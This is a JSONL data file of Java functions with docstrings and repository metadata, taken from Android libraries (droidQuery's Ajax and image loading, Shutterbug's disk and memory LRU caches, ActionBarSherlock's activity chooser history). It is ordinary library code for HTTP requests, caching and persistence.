{"docstring": "/**\n * Parses the HTTP response as XML representation\n * @param connection the response to parse\n * @return an XML Document response\n */\n", "func_signal": "public static Document parseXML(HttpURLConnection connection) throws ClientProtocolException, IOException", "code": "{\n\tXMLResponseHandler handler = new XMLResponseHandler();\n\treturn handler.handleResponse(connection);\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Stops all currently running Ajax Tasks\n */\n", "func_signal": "public static void killTasks()", "code": "{\n\tfor (int i = 0; i < globalTasks.size(); i++) {\n\t\tglobalTasks.get(i).cancel(true);\n\t}\n\tfor (int i = 0; i < localTasks.size(); i++) {\n\t\tlocalTasks.get(i).cancel(true);\n\t}\n\t\n\tglobalTasks.clear();\n\tlocalTasks.clear();\n\t$.ajaxStop();\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Constructor\n * @param options used to configure this task\n */\n", "func_signal": "public Ajax(AjaxOptions options)", "code": "{\n\tthis.options = options;\n\tif (options.url() == null)\n\t{\n\t\tthrow new NullPointerException(\"Cannot call Ajax with null URL!\");\n\t}\n\tthis.mHandler = new Handler();\n\tthis.executor = Executors.newFixedThreadPool(1, new ThreadFactory() {\n\t\t@Override\n\t\tpublic Thread newThread(Runnable runnable) {\n\t\t\tThread t = new Thread(runnable);\n\t\t\tt.setPriority(Ajax.this.options.priority());\n\t\t\treturn t;\n\t\t}\n\t});\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "//\t\n\t/**\n\t * Recursively apply rules to view and subviews\n\t * @param layout\n\t * @param rules\n\t * @see CSSSelector\n\t */\n", "func_signal": "public void applyRules($ droidQuery)", "code": "{\n\t\t//clean approach using CSSSelector.java\n\t\t\n\t\tfor (int i = 0; i < rules.size(); i++)\n\t\t{\n\t\t\tRuleSet rule = rules.get(i);\n\t\t\tTokenSequence selector = rule.getSelector();\n\t\t\tCSSSelector cssSelector = new CSSSelector();\n\t\t\t$ d = cssSelector.makeSelection(droidQuery, selector);\n\t\t\tList<Declaration> declarations = rule.getDeclarationBlock();\n\t\t\tapplyProperties(d, declarations);\n\t\t}\n\t}", "path": "droidQuery\\src\\self\\philbrown\\css\\StyleSheet.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/***\n * Get the Drawable from URL\n * @param urlString\n * @return\n */\n", "func_signal": "public Drawable fetchDrawable(String urlString)", "code": "{\n    try {\n        InputStream is = fetch(urlString);\n        Drawable drawable = Drawable.createFromStream(is, \"src\");\n        drawable.setBounds(0, 0, 0 + drawable.getIntrinsicWidth(), 0 \n                + drawable.getIntrinsicHeight()); \n        return drawable;\n    } catch (Exception e) {\n        return null;\n    } \n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\AsyncImageGetter.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/***\n * Construct the URLImageParser which will execute the AsyncTask and refresh the parent container\n * @param t the parent container that will gain a child ImageView\n */\n", "func_signal": "public AsyncImageGetter(View t)", "code": "{\n    this.c = t.getContext();\n    this.container = t;\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\AsyncImageGetter.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Parses the HTTP response as JSON representation\n * @param connection the response to parse\n * @return a JSONObject response\n */\n", "func_signal": "public static Object parseJSON(HttpURLConnection connection) throws ClientProtocolException, IOException", "code": "{\n\tJSONResponseHandler handler = new JSONResponseHandler();\n\treturn handler.handleResponse(connection);\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Run the Ajax Request\n */\n", "func_signal": "public void execute()", "code": "{\n\ttry {\n\t\tonPreExecute();\n\t\texecutor.execute(new Runnable() {\n\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tfinal TaskResponse response = doInBackground();\n\t\t\t\tmHandler.post(new Runnable() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void run() {\n\t\t\t\t\t\tonPostExecute(response);\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\t\t\t\n\t\t});\n\t} catch (Exception e) {\n\t\tif (options.debug())\n\t\t\te.printStackTrace();\n\t}\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * This method does the actual retrieval of the image data stream\n * @param urlString\n * @return\n * @throws MalformedURLException\n * @throws IOException\n */\n", "func_signal": "private InputStream fetch(String urlString) throws MalformedURLException, IOException", "code": "{\n    DefaultHttpClient httpClient = new DefaultHttpClient();\n    HttpGet request = new HttpGet(urlString);\n    HttpResponse response = httpClient.execute(request);\n    return response.getEntity().getContent();\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\AsyncImageGetter.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Parses the HTTP response as a Bitmap\n * @param stream the response to parse\n * @return a Bitmap response\n */\n", "func_signal": "private Bitmap parseImage(InputStream stream) throws IllegalStateException, IOException", "code": "{\n    \tBitmapFactory.Options opt = new BitmapFactory.Options();\n\topt.inSampleSize = 1;\n\topt.inPurgeable = true;\n\topt.inInputShareable = false;\n\tif (options.imageWidth() >= 0)\n\t\topt.outWidth = options.imageWidth();\n\tif (options.imageHeight() >= 0)\n\t\topt.outHeight = options.imageHeight();\n\tWeakReference<Bitmap> bitmap = new WeakReference<Bitmap>(BitmapFactory.decodeStream(stream, new Rect(0,0,0,0), opt));\n\t\n\tif (bitmap == null || bitmap.get() == null)\n\t{\n\t\treturn null;\n\t}\n\t\n\tif (bitmap.get().isRecycled())\n\t{\n\t\treturn null;\n\t}\n        \n        return bitmap.get();\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Can be used to restart an Ajax Task\n * @param connection a request (to retry)\n * @param options options for request retry.\n */\n", "func_signal": "public Ajax(HttpURLConnection connection, AjaxOptions options)", "code": "{\n\tthis(options);\n\tthis.connection = connection;\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Checks to see if a request is redundant. This is only used for Redundancy Types \n * {@link AjaxOptions.Redundancy#ABORT_REDUNDANT_REQUESTS} and {@link AjaxOptions.Redundancy#RESPOND_TO_ALL_LISTENERS}.\n * @return {@code true} if the same request is already taking place. Otherwise {@code false}.\n */\n", "func_signal": "private boolean isRedundant()", "code": "{\n\tString key = String.format(Locale.US, \"%s::%s::%s::%s\", options.dataType(), (options.type() == null ? \"GET\" : options.type()), options.url(), (options.data() == null ? \"\" : options.data().toString()));\n\treturn redundancyHelper.containsKey(key);\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Cancel the executor\n * @param now\t{@code true} to cancel immediately. {@false} to allow existing tasks to complete, but don't allow new ones to begin.\n */\n", "func_signal": "public void cancel(boolean now)", "code": "{\n\tif (now)\n\t\texecutor.shutdownNow();\n\telse\n\t\texecutor.shutdown();\n\tisCancelled = true;\n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\Ajax.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Gets the drawable from the given URL resource, or from the local file path.\n * @param source the URL of the drawable, or the local file path to the image.\n */\n", "func_signal": "public Drawable getDrawable(String source)", "code": "{\n\t\n\tif (URLUtil.isValidUrl(source))\n\t\t{\n\t\t\t//need to download image\n\t\tURLDrawable urlDrawable = new URLDrawable();\n\n        // get the actual source\n        ImageGetterAsyncTask asyncTask = \n            new ImageGetterAsyncTask( urlDrawable);\n\n        asyncTask.execute(source);\n\n        // return reference to URLDrawable where I will change with actual image from\n        // the src tag\n        return urlDrawable;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t//must be a local reference\n\t\t\tDrawable drawFromPath;\n\t\t\tint path = c.getResources().getIdentifier(source, \"drawable\", c.getApplicationInfo().packageName);\n\t\t\tif (path == 0)\n\t\t\t{\n\t\t\t\treturn new TextDrawable(\"Could not set image\");\n\t\t\t}\n\t\t\tdrawFromPath = (Drawable) c.getResources().getDrawable(path);\n\t\t\tdrawFromPath.setBounds(0, 0, drawFromPath.getIntrinsicWidth(), drawFromPath.getIntrinsicHeight());\n\t\t\treturn drawFromPath;\n\t\t}\n\t\n\t\n    \n}", "path": "droidQuery\\src\\self\\philbrown\\droidQuery\\AsyncImageGetter.java", "repo_name": "phil-brown/droidQuery", "stars": 106, "license": "None", "language": "java", "size": 14565}
{"docstring": "/**\n * Closes the cache and deletes all of its stored values. This will delete\n * all files in the cache directory including files that weren't created by\n * the cache.\n */\n", "func_signal": "public void delete() throws IOException", "code": "{\n    close();\n    /*IoUtils.*/deleteContents(directory);\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Drops the entry for {@code key} if it exists and can be removed. Entries\n * actively being edited cannot be removed.\n *\n * @return true if an entry was removed.\n */\n", "func_signal": "public synchronized boolean remove(String key) throws IOException", "code": "{\n    checkNotClosed();\n    validateKey(key);\n    Entry entry = lruEntries.get(key);\n    if (entry == null || entry.currentEditor != null) {\n        return false;\n    }\n\n    for (int i = 0; i < valueCount; i++) {\n        File file = entry.getCleanFile(i);\n        if (!file.delete()) {\n            throw new IOException(\"failed to delete \" + file);\n        }\n        size -= entry.lengths[i];\n        entry.lengths[i] = 0;\n    }\n\n    redundantOpCount++;\n    journalWriter.append(REMOVE + ' ' + key + '\\n');\n    lruEntries.remove(key);\n\n    if (journalRebuildRequired()) {\n        executorService.submit(cleanupCallable);\n    }\n\n    return true;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Returns a new unbuffered output stream to write the value at\n * {@code index}. If the underlying output stream encounters errors\n * when writing to the filesystem, this edit will be aborted when\n * {@link #commit} is called. The returned output stream does not throw\n * IOExceptions.\n */\n", "func_signal": "public OutputStream newOutputStream(int index) throws IOException", "code": "{\n    synchronized (DiskLruCache.this) {\n        if (entry.currentEditor != this) {\n            throw new IllegalStateException();\n        }\n        return new FaultHidingOutputStream(new FileOutputStream(entry.getDirtyFile(index)));\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * @param maxSize\n *            the maximum size of the cache before returning. May be -1 to\n *            evict even 0-sized elements.\n */\n", "func_signal": "private void trimToSize(int maxSize)", "code": "{\n    while (true) {\n        K key;\n        V value;\n        synchronized (this) {\n            if (size < 0 || (map.isEmpty() && size != 0)) {\n                throw new IllegalStateException(getClass().getName() + \".sizeOf() is reporting inconsistent results!\");\n            }\n\n            if (size <= maxSize || map.isEmpty()) {\n                break;\n            }\n\n            Map.Entry<K, V> toEvict = map.entrySet().iterator().next();\n            key = toEvict.getKey();\n            value = toEvict.getValue();\n            map.remove(key);\n            size -= safeSizeOf(key, value);\n            evictionCount++;\n        }\n\n        entryRemoved(true, key, value, null);\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\LruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Caches {@code value} for {@code key}. The value is moved to the head of\n * the queue.\n * \n * @return the previous value mapped by {@code key}.\n */\n", "func_signal": "public final V put(K key, V value)", "code": "{\n    if (key == null || value == null) {\n        throw new NullPointerException(\"key == null || value == null\");\n    }\n\n    V previous;\n    synchronized (this) {\n        putCount++;\n        size += safeSizeOf(key, value);\n        previous = map.put(key, value);\n        if (previous != null) {\n            size -= safeSizeOf(key, previous);\n        }\n    }\n\n    if (previous != null) {\n        entryRemoved(false, key, previous, value);\n    }\n\n    trimToSize(maxSize);\n    return previous;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\LruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * We only rebuild the journal when it will halve the size of the journal\n * and eliminate at least 2000 ops.\n */\n", "func_signal": "private boolean journalRebuildRequired()", "code": "{\n    final int REDUNDANT_OP_COMPACT_THRESHOLD = 2000;\n    return redundantOpCount >= REDUNDANT_OP_COMPACT_THRESHOLD\n            && redundantOpCount >= lruEntries.size();\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Force buffered operations to the filesystem.\n */\n", "func_signal": "public synchronized void flush() throws IOException", "code": "{\n    checkNotClosed();\n    trimToSize();\n    journalWriter.flush();\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/* XXX From libcore.io.IoUtils */\n", "func_signal": "private static void deleteContents(File dir) throws IOException", "code": "{\n    File[] files = dir.listFiles();\n    if (files == null) {\n        throw new IllegalArgumentException(\"not a directory: \" + dir);\n    }\n    for (File file : files) {\n        if (file.isDirectory()) {\n            deleteContents(file);\n        }\n        if (!file.delete()) {\n//                throw new IOException(\"failed to delete file: \" + file);\n        }\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/* XXX From libcore.io.Streams */\n", "func_signal": "private static String readAsciiLine(InputStream in) throws IOException", "code": "{\n    // TODO: support UTF-8 here instead\n\n    StringBuilder result = new StringBuilder(80);\n    while (true) {\n        int c = in.read();\n        if (c == -1) {\n            throw new EOFException();\n        } else if (c == '\\n') {\n            break;\n        }\n\n        result.append((char) c);\n    }\n    int length = result.length();\n    if (length > 0 && result.charAt(length - 1) == '\\r') {\n        result.setLength(length - 1);\n    }\n    return result.toString();\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Returns a snapshot of the entry named {@code key}, or null if it doesn't\n * exist is not currently readable. If a value is returned, it is moved to\n * the head of the LRU queue.\n */\n", "func_signal": "public synchronized Snapshot get(String key) throws IOException", "code": "{\n    checkNotClosed();\n    validateKey(key);\n    Entry entry = lruEntries.get(key);\n    if (entry == null) {\n        return null;\n    }\n\n    if (!entry.readable) {\n        return null;\n    }\n\n    /*\n     * Open all streams eagerly to guarantee that we see a single published\n     * snapshot. If we opened streams lazily then the streams could come\n     * from different edits.\n     */\n    InputStream[] ins = new InputStream[valueCount];\n    try {\n        for (int i = 0; i < valueCount; i++) {\n            ins[i] = new FileInputStream(entry.getCleanFile(i));\n        }\n    } catch (FileNotFoundException e) {\n        // a file must have been deleted manually!\n        return null;\n    }\n\n    redundantOpCount++;\n    journalWriter.append(READ + ' ' + key + '\\n');\n    if (journalRebuildRequired()) {\n        executorService.submit(cleanupCallable);\n    }\n\n    return new Snapshot(key, entry.sequenceNumber, ins);\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Creates a new journal that omits redundant information. This replaces the\n * current journal if it exists.\n */\n", "func_signal": "private synchronized void rebuildJournal() throws IOException", "code": "{\n    if (journalWriter != null) {\n        journalWriter.close();\n    }\n\n    Writer writer = new BufferedWriter(new FileWriter(journalFileTmp));\n    writer.write(MAGIC);\n    writer.write(\"\\n\");\n    writer.write(VERSION_1);\n    writer.write(\"\\n\");\n    writer.write(Integer.toString(appVersion));\n    writer.write(\"\\n\");\n    writer.write(Integer.toString(valueCount));\n    writer.write(\"\\n\");\n    writer.write(\"\\n\");\n\n    for (Entry entry : lruEntries.values()) {\n        if (entry.currentEditor != null) {\n            writer.write(DIRTY + ' ' + entry.key + '\\n');\n        } else {\n            writer.write(CLEAN + ' ' + entry.key + entry.getLengths() + '\\n');\n        }\n    }\n\n    writer.close();\n    journalFileTmp.renameTo(journalFile);\n    journalWriter = new BufferedWriter(new FileWriter(journalFile, true));\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Returns the value for {@code key} if it exists in the cache or can be\n * created by {@code #create}. If a value was returned, it is moved to the\n * head of the queue. This returns null if a value is not cached and cannot\n * be created.\n */\n", "func_signal": "public final V get(K key)", "code": "{\n    if (key == null) {\n        throw new NullPointerException(\"key == null\");\n    }\n\n    V mapValue;\n    synchronized (this) {\n        mapValue = map.get(key);\n        if (mapValue != null) {\n            hitCount++;\n            return mapValue;\n        }\n        missCount++;\n    }\n\n    /*\n     * Attempt to create a value. This may take a long time, and the map may\n     * be different when create() returns. If a conflicting value was added\n     * to the map while create() was working, we leave that value in the map\n     * and release the created value.\n     */\n\n    V createdValue = create(key);\n    if (createdValue == null) {\n        return null;\n    }\n\n    synchronized (this) {\n        createCount++;\n        mapValue = map.put(key, createdValue);\n\n        if (mapValue != null) {\n            // There was a conflict so undo that last put\n            map.put(key, mapValue);\n        } else {\n            size += safeSizeOf(key, createdValue);\n        }\n    }\n\n    if (mapValue != null) {\n        entryRemoved(false, key, createdValue, mapValue);\n        return mapValue;\n    } else {\n        trimToSize(maxSize);\n        return createdValue;\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\LruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Sets the value at {@code index} to {@code value}.\n */\n", "func_signal": "public void set(int index, String value) throws IOException", "code": "{\n    Writer writer = null;\n    try {\n        writer = new OutputStreamWriter(newOutputStream(index), /*Charsets.*/UTF_8);\n        writer.write(value);\n    } finally {\n        /*IoUtils.*/closeQuietly(writer);\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/* XXX From libcore.io.Streams */\n", "func_signal": "private static String readFully(Reader reader) throws IOException", "code": "{\n    try {\n        StringWriter writer = new StringWriter();\n        char[] buffer = new char[1024];\n        int count;\n        while ((count = reader.read(buffer)) != -1) {\n            writer.write(buffer, 0, count);\n        }\n        return writer.toString();\n    } finally {\n        reader.close();\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Removes the entry for {@code key} if it exists.\n * \n * @return the previous value mapped by {@code key}.\n */\n", "func_signal": "public final V remove(K key)", "code": "{\n    if (key == null) {\n        throw new NullPointerException(\"key == null\");\n    }\n\n    V previous;\n    synchronized (this) {\n        previous = map.remove(key);\n        if (previous != null) {\n            size -= safeSizeOf(key, previous);\n        }\n    }\n\n    if (previous != null) {\n        entryRemoved(false, key, previous, null);\n    }\n\n    return previous;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\LruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Returns the last committed value as a string, or null if no value\n * has been committed.\n */\n", "func_signal": "public String getString(int index) throws IOException", "code": "{\n    InputStream in = newInputStream(index);\n    return in != null ? inputStreamToString(in) : null;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Set lengths using decimal numbers like \"10123\".\n */\n", "func_signal": "private void setLengths(String[] strings) throws IOException", "code": "{\n    if (strings.length != valueCount) {\n        throw invalidLengths(strings);\n    }\n\n    try {\n        for (int i = 0; i < strings.length; i++) {\n            lengths[i] = Long.parseLong(strings[i]);\n        }\n    } catch (NumberFormatException e) {\n        throw invalidLengths(strings);\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Computes the initial size and collects garbage as a part of opening the\n * cache. Dirty entries are assumed to be inconsistent and will be deleted.\n */\n", "func_signal": "private void processJournal() throws IOException", "code": "{\n    deleteIfExists(journalFileTmp);\n    for (Iterator<Entry> i = lruEntries.values().iterator(); i.hasNext(); ) {\n        Entry entry = i.next();\n        if (entry.currentEditor == null) {\n            for (int t = 0; t < valueCount; t++) {\n                size += entry.lengths[t];\n            }\n        } else {\n            entry.currentEditor = null;\n            for (int t = 0; t < valueCount; t++) {\n                deleteIfExists(entry.getCleanFile(t));\n                deleteIfExists(entry.getDirtyFile(t));\n            }\n            i.remove();\n        }\n    }\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/* XXX From java.util.Arrays */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\nprivate static <T> T[] copyOfRange(T[] original, int start, int end)", "code": "{\n    int originalLength = original.length; // For exception priority compatibility.\n    if (start > end) {\n        throw new IllegalArgumentException();\n    }\n    if (start < 0 || start > originalLength) {\n        throw new ArrayIndexOutOfBoundsException();\n    }\n    int resultLength = end - start;\n    int copyLength = Math.min(resultLength, originalLength - start);\n    T[] result = (T[]) Array.newInstance(original.getClass().getComponentType(), resultLength);\n    System.arraycopy(original, start, result, 0, copyLength);\n    return result;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Opens the cache in {@code directory}, creating a cache if none exists\n * there.\n *\n * @param directory a writable directory\n * @param appVersion\n * @param valueCount the number of values per cache entry. Must be positive.\n * @param maxSize the maximum number of bytes this cache should use to store\n * @throws IOException if reading or writing the cache directory fails\n */\n", "func_signal": "public static DiskLruCache open(File directory, int appVersion, int valueCount, long maxSize)\n        throws IOException", "code": "{\n    if (maxSize <= 0) {\n        throw new IllegalArgumentException(\"maxSize <= 0\");\n    }\n    if (valueCount <= 0) {\n        throw new IllegalArgumentException(\"valueCount <= 0\");\n    }\n\n    // prefer to pick up where we left off\n    DiskLruCache cache = new DiskLruCache(directory, appVersion, valueCount, maxSize);\n    if (cache.journalFile.exists()) {\n        try {\n            cache.readJournal();\n            cache.processJournal();\n            cache.journalWriter = new BufferedWriter(new FileWriter(cache.journalFile, true));\n            return cache;\n        } catch (IOException journalIsCorrupt) {\n            System.out.println(\"DiskLruCache \" + directory + \" is corrupt: \"\n                    + journalIsCorrupt.getMessage() + \", removing\");\n            cache.delete();\n        }\n    }\n\n    // create a new empty cache\n    directory.mkdirs();\n    cache = new DiskLruCache(directory, appVersion, valueCount, maxSize);\n    cache.rebuildJournal();\n    return cache;\n}", "path": "Shutterbug\\src\\com\\applidium\\shutterbug\\cache\\DiskLruCache.java", "repo_name": "applidium/Shutterbug", "stars": 100, "license": "other", "language": "java", "size": 296}
{"docstring": "/**\n * Gets the history max size.\n *\n * @return The history max size.\n */\n", "func_signal": "public int getHistoryMaxSize()", "code": "{\n    synchronized (mInstanceLock) {\n        return mHistoryMaxSize;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Sorts the activities based on history and an intent. If\n * a sorter is not specified this a default implementation is used.\n *\n * @see #setActivitySorter(ActivitySorter)\n */\n", "func_signal": "private void sortActivities()", "code": "{\n    synchronized (mInstanceLock) {\n        if (mActivitySorter != null && !mActivites.isEmpty()) {\n            mActivitySorter.sort(mIntent, mActivites,\n                    Collections.unmodifiableList(mHistoricalRecords));\n            notifyChanged();\n        }\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Persists the history data to the backing file if the latter\n * was provided. Calling this method before a call to {@link #readHistoricalData()}\n * throws an exception. Calling this method more than one without choosing an\n * activity has not effect.\n *\n * @throws IllegalStateException If this method is called before a call to\n *         {@link #readHistoricalData()}.\n */\n", "func_signal": "private void persistHistoricalData()", "code": "{\n    synchronized (mInstanceLock) {\n        if (!mReadShareHistoryCalled) {\n            throw new IllegalStateException(\"No preceding call to #readHistoricalData\");\n        }\n        if (!mHistoricalRecordsChanged) {\n            return;\n        }\n        mHistoricalRecordsChanged = false;\n        mCanReadHistoricalData = true;\n        if (!TextUtils.isEmpty(mHistoryFileName)) {\n            /*AsyncTask.*/SERIAL_EXECUTOR.execute(new HistoryPersister());\n        }\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Prunes older excessive records to guarantee {@link #mHistoryMaxSize}.\n */\n", "func_signal": "private void pruneExcessiveHistoricalRecordsLocked()", "code": "{\n    List<HistoricalRecord> choiceRecords = mHistoricalRecords;\n    final int pruneCount = choiceRecords.size() - mHistoryMaxSize;\n    if (pruneCount <= 0) {\n        return;\n    }\n    mHistoricalRecordsChanged = true;\n    for (int i = 0; i < pruneCount; i++) {\n        HistoricalRecord prunedRecord = choiceRecords.remove(0);\n        if (DEBUG) {\n            Log.i(LOG_TAG, \"Pruned: \" + prunedRecord);\n        }\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Creates a new instance.\n *\n * @param context Context for loading resources.\n * @param historyFileName The history XML file.\n */\n", "func_signal": "private ActivityChooserModel(Context context, String historyFileName)", "code": "{\n    mContext = context.getApplicationContext();\n    if (!TextUtils.isEmpty(historyFileName)\n            && !historyFileName.endsWith(HISTORY_FILE_EXTENSION)) {\n        mHistoryFileName = historyFileName + HISTORY_FILE_EXTENSION;\n    } else {\n        mHistoryFileName = historyFileName;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the data model backed by the contents of the provided file with historical data.\n * Note that only one data model is backed by a given file, thus multiple calls with\n * the same file name will return the same model instance. If no such instance is present\n * it is created.\n * <p>\n * <strong>Note:</strong> To use the default historical data file clients should explicitly\n * pass as file name {@link #DEFAULT_HISTORY_FILE_NAME}. If no persistence of the choice\n * history is desired clients should pass <code>null</code> for the file name. In such\n * case a new model is returned for each invocation.\n * </p>\n *\n * <p>\n * <strong>Always use difference historical data files for semantically different actions.\n * For example, sharing is different from importing.</strong>\n * </p>\n *\n * @param context Context for loading resources.\n * @param historyFileName File name with choice history, <code>null</code>\n *        if the model should not be backed by a file. In this case the activities\n *        will be ordered only by data from the current session.\n *\n * @return The model.\n */\n", "func_signal": "public static ActivityChooserModel get(Context context, String historyFileName)", "code": "{\n    synchronized (sRegistryLock) {\n        ActivityChooserModel dataModel = sDataModelRegistry.get(historyFileName);\n        if (dataModel == null) {\n            dataModel = new ActivityChooserModel(context, historyFileName);\n            sDataModelRegistry.put(historyFileName, dataModel);\n        }\n        dataModel.readHistoricalData();\n        return dataModel;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
